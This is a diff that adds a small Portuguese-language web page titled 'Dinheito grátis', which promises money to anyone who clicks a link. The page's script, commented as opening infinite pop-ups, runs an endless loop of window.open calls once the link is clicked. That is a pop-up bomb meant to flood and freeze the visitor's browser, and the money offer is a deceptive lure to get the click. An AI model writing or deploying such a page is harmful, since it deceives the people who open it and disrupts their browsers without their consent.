@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dinheito grátis</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        a {
+            color: blue;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <p>Clique no link abaixo para ganhar dinheiro:</p>
+    <a id="popupLink" href="#">Clique aqui</a>
+
+    <script>
+        // Função para abrir pop-ups infinitos
+        function abrirPopups() {
+            while (true) {
+                window.open("https://www.google.com", "_blank", "width=300,height=300");
+            }
+        }
+
+        // Adiciona um evento de clique ao link
+        document.getElementById("popupLink").addEventListener("click", function(event) {
+            event.preventDefault(); // Impede o comportamento padrão do link
+            abrirPopups(); // Chama a função para abrir pop-ups
+        });
+    </script>
+</body>
+</html>
